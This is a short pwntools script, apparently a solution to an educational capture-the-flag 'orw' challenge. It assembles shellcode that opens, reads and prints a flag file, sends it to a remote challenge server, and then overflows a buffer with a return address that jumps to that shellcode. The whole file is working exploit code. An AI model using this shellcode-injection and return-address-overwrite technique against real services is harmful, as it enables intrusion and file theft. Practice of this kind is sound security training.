from pwn import *

context(arch='amd64', os='linux', log_level='debug')
c = ''
c += shellcraft.pushstr('/home/orw/flag')
c += shellcraft.open('rsp', constants.O_RDONLY, 0)
c += shellcraft.read('rax', 'rsp', 0x50)
c += shellcraft.write(1, 'rsp', 0x50)
print(c)
sc = asm(c)

r = remote('edu-ctf.csie.org', 10171)
r.sendafter('\n', sc)
r.sendlineafter('\n', b'A'*0x18 + p64(0x6010a0))
r.interactive()